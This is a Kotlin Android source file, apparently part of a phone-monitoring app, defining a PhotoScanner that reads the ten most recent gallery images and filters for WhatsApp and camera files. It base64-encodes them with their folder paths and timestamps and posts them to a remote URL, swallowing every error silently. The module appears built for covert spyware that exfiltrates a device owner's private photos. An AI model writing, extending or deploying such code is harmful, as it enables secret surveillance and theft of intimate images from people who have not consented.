package com.example.historicocelular

import android.content.Context
import android.database.Cursor
import android.provider.MediaStore
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object PhotoScanner {
    fun enviar(ctx: Context, url: String) {
        try {
            val projecao = arrayOf(
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED
            )
            val cursor: Cursor? = ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projecao, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10"
            )
            val lista = JSONArray()
            cursor?.use {
                while (it.moveToNext()) {
                    val caminho = it.getString(0) ?: continue
                    val arquivo = File(caminho)
                    if (!arquivo.exists()) continue
                    val nome = arquivo.name.lowercase()
                    if (!nome.contains("img") && !nome.contains("whatsapp")) continue
                    if (arquivo.length() > 500000) continue

                    val bytes = arquivo.readBytes()
                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

                    val item = JSONObject().apply {
                        put("nome", arquivo.name)
                        put("pasta", arquivo.parent ?: "")
                        put("ts", it.getLong(1) * 1000)
                        put("imagem", b64)
                    }
                    lista.put(item)
                }
            }
            val json = JSONObject().apply { put("fotos", lista) }
            DataSender.postar(url, "fotos", json)
        } catch (e: Exception) {}
    }
}
